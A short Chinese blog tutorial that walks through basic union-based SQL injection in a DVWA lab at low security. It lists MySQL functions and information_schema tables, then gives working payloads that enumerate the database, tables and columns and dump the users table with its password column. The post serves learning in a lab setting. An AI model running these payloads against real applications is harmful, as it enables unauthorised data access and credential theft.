---
title: 简单sql注入过程
date: 2018-07-06 14:17:10
tags: sql
---

原理就不说了，介绍最简单的sql注入的一般过程，单引号型且无过滤

# 常用函数

* user()：返回数据库的用户名
* database()：返回当前用的数据库名
* version()：返回数据库版本
* union()：连接多个select结果，要求每个语句有相等的列，列类型、顺序相等
* concat_ws()：将一行结果中的多列连接起来，第一个参数为连接分割符，后面参数为要查询的东西


# mysql通用数据库

每个mysql都有一个通用数据库：information_schema，其中有几个重要的表：

* SCHEMATA
	* 存储所有数据库
	* 重要列：
		* SCHEMA_NAME：数据库的名字
* TABLES
	* 存储所有表
	* 重要列：
		* TABLE_SCHEMA：该表所在的数据库名
		* TABLE_NAME：表名
* COLUMNS
	* 存储所有列
	* 重要列：
		* TABLE_SCHEMA：该列所在表所在数据库名
		* TABLE_NAME：该列所在的表名
		* COLUME_NAME：列名


用法：

1. 通过database()得到所用的数据库
2. 通过TABLES表，匹配数据库名，来查看该库中有哪些表
3. 通过COLUMNS表，匹配数据库名、表名，来查看该表中有哪些列
4. dump


# 具体实例


环境为xampp+dvwa，设置安全系数为low

1. 找注入点：明显是个单引号注入
2. 注入：
	* 查看所用库： `' union select 1,database()#` 
	
	![](https://i.imgur.com/kR2CYY5.png)

	* 查看该库中的所有表： 
	
	`' union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = 'dvwa' #`
	
	![](https://i.imgur.com/Oo1bHBA.png)

	* 查看users表中有哪些列： 
	
	`' union select 1,COLUMN_NAME from information_schema.COLUMNS where  TABLE_SCHEMA = 'dvwa' and TABLE_NAME = 'users' #`
	
	![](https://i.imgur.com/5QwxXg7.png)
	* dump:	`' union select 1,concat_ws(' - ',user_id,first_name,last_name,user,password) from users #`

	![](https://i.imgur.com/MtbNVPP.png)


# 小结
这是最简单的注入过程，也可用sqlmap代替

注入的难点在于找到注入点，和绕过对关键字的过滤


